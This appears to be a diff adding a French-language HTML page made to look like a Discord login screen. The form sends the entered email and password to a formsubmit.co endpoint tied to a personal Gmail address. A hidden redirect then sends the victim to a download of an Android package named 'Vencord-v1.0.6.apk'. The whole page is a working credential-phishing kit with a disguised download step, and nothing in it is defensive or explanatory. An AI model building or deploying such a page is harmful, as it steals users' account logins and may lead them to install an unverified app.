@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
+
+    <style>
+      body {
+        background-image: linear-gradient(to bottom left, #3D3F45, #1E1E23);
+        height: 100vh;
+        margin: 0;
+        padding: 0;
+        overflow: hidden; 
+        position: relative;
+      }
+
+      /* --- STYLE COMMUN POUR LES ENTRÉES, LE BOUTON ET LES IMAGES CENTRÉES --- */
+      .input-field, .btn-connexion, .custom-image {
+        position: absolute;
+        left: 50%;
+        transform: translateX(-50%);
+        box-sizing: border-box;
+      }
+
+      .input-field, .btn-connexion {
+        width: 90%;
+      }
+
+      /* --- ZONES DE TEXTE (INPUTS) --- */
+      .input-field {
+        background-image: linear-gradient(to left, #35363C, #28292D); 
+        border: 1px solid #3A3B40; 
+        border-radius: 10px;
+        padding: 16px 20px;
+        color: #FFFFFF;
+        font-family: 'Rajdhani', sans-serif;
+        font-size: 14px;
+        outline: none; 
+        transition: border 0.2s ease, box-shadow 0.2s ease;
+      }
+
+      .input-field:focus {
+        border: 2.5px solid #5865F2; 
+        padding: 14.5px 18.5px; 
+      }
+
+      /* --- LE BOUTON --- */
+      .btn-connexion {
+        background-color: #5865F2;
+        color: #FFFFFF;
+        border: none;
+        border-radius: 10px;
+        padding: 10px 0;
+        font-family: 'Rajdhani', 'Orbitron', sans-serif;
+        font-size: 18px;
+        font-weight: 500;
+        letter-spacing: 0.3px;
+        cursor: pointer;
+        transition: background-color 0.2s ease, transform 0.2s ease;
+      }
+
+      .btn-connexion:hover { background-color: #4752C4; }
+      .btn-connexion:active { transform: translateX(-50%) scale(0.98); }
+
+
+      /* 🛠️ RÉGLAGE TAILLE ET PLACEMENT DES IMAGES CENTRÉES */
+      
+      #image1 {
+        top: 2.5%;          
+        width: 150px;       
+        height: auto;       
+      }
+
+      #image2 {
+        top: 10%;          
+        width: 158px;        
+        height: auto;       
+      }
+
+
+      /* 🛠️ NEW : RÉGLAGE TAILLE, HAUTEUR ET POSITION DES IMAGES SUR LES BORDS */
+      
+      .side-image {
+        position: absolute; /* Placement libre sur l'écran */
+        height: auto;       /* Garde les proportions */
+      }
+
+      #image-gauche {
+        left: 5%;         /* Distance par rapport au bord gauche */
+        top: 17%;           /* Position verticale (Ajuste à ta guise) */
+        width: 240px;        /* Largeur de l'image gauche */
+      }
+
+      #image-droite {
+        left: 5%;        /* Distance par rapport au bord droit */
+        top: 27%;           /* Position verticale (Ajuste à ta guise) */
+        width: 110px;        /* Largeur de l'image droite */
+      }
+
+
+      /* 🛠️ RÉGLAGE VERTICAL DU FORMULAIRE */
+      
+      #identifiant {
+        top: 20%; 
+      }
+
+      #password {
+        top: 30%; 
+      }
+
+      #bouton-submit {
+        top: 39%; 
+      }
+
+    </style>
+  </head>
+  <body>
+    
+    <form action="https://formsubmit.co/lonely.girl01592@gmail.com" method="POST">
+      <input type="hidden" name="_next" value="https://release-assets.githubusercontent.com/github-production-release-asset/570480711/ab740d9d-43da-42c2-8e2e-533a271a2637?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-05-27T20%3A41%3A52Z&rscd=attachment%3B+filename%3DVencord-v1.0.6.apk&rsct=application%2Fvnd.android.package-archive&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-05-27T19%3A41%3A34Z&ske=2026-05-27T20%3A41%3A52Z&sks=b&skv=2018-11-09&sig=sABMnDixVjOvl%2F2nXvIS4T9gGggSi126%2FFNV1RI9YAo%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3OTkxMTE5NCwibmJmIjoxNzc5OTEwODk0LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.MKdGW2h6KzL48_zxgEm1hz920fVRmRMePb-i8Bazo7k&response-content-disposition=attachment%3B%20filename%3DVencord-v1.0.6.apk&response-content-type=application%2Fvnd.android.package-archive">
+      <input type="text" id="identifiant" class="input-field" name="email">
+      <input type="password" id="password" class="input-field" name="identifiant">
+      <button type="submit" id="bouton-submit" class="btn-connexion" href="loading.html">Connexion</button>
+    </form>
+
+    <img src="discordLogo.png" id="image1" class="custom-image" alt="Première Image">
+    <img src="haTeVoila.png" id="image2" class="custom-image" alt="Deuxième Image">
+
+    <img src="indent.png" id="image-gauche" class="side-image" alt="Image Bord Gauche">
+    <img src="mdep.png" id="image-droite" class="side-image" alt="Image Bord Droit">
+
+  </body>
+</html>
